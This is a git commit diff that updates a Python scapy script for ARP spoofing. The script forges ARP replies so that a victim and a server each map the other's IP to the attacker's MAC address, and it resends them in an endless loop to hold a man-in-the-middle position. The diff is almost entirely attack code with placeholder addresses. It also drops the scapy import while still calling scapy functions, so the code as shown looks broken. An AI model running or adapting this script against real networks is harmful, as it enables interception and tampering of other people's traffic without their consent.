f8b87f2edcf72e502bafabe4384f164d3debf1a0
WGAVermeer <90707235+WGAVermeer@users.noreply.github.com>
2023-06-06 12:42:52 +0200

    update main.py

--- main.py
+++ main.py
@@ -1,8 +1,11 @@
-from scapy.all import *
+ 
 import time
 
-macAttacker = "ff:ff:ff:ff:ff:ff"
-ipAttacker = "255:255:255:255"
+interface = conf.iface
+
+macAttacker = get_if_hwaddr(interface)
+ipAttacker = get_if_addr(interface)
+
 
 macVictim = "ff:ff:ff:ff:ff:ff"
 ipVictim = "255.255.255.255"
@@ -10,21 +13,29 @@ ipVictim = "255.255.255.255"
 macServer = "ff:ff:ff:ff:ff:ff"
 ipServer = "255.255.255.255"
 
-arpTo = Ether() / ARP()
-arpTo[Ether].src = macAttacker
-arpTo[ARP].hwsrc = macAttacker
-arpTo[ARP].psrc = ipServer
-arpTo[ARP].hwdst = macServer
-arpTo[ARP].pdst = ipVictim
+def mkspoofARP(ipVictim, ipServer):
+    macVictim = getmacbyip(ipVictim)
+    macServer = getmacbyip(ipServer)
 
-arpFrom = Ether() / ARP()
-arpFrom[Ether].src = macAttacker
-arpFrom[ARP].hwsrc = macAttacker
-arpFrom[ARP].psrc = ipVictim
-arpFrom[ARP].hwdst = macServer
-arpFrom[ARP].pdst = ipServer
+    arpTo = Ether() / ARP()
+    arpTo[Ether].src = macAttacker
+    arpTo[ARP].hwsrc = macAttacker
+    arpTo[ARP].psrc = ipServer
+    arpTo[ARP].hwdst = macServer
+    arpTo[ARP].pdst = ipVictim
+
+    arpFrom = Ether() / ARP()
+    arpFrom[Ether].src = macAttacker
+    arpFrom[ARP].hwsrc = macAttacker
+    arpFrom[ARP].psrc = ipVictim
+    arpFrom[ARP].hwdst = macServer
+    arpFrom[ARP].pdst = ipServer
+
+    return (arpTo, arpFrom)
+
+ARPmsg = mkspoofARP(ipVictim, ipServer)
 
 while(True):
-    sendp(arpFrom, iface="enp0s3")
-    sendp(arpTo, iface="enp0s3")
+    sendp(ARPmsg[0], iface=interface)
+    sendp(ARPmsg[1], iface=interface)
     time.sleep(3600)
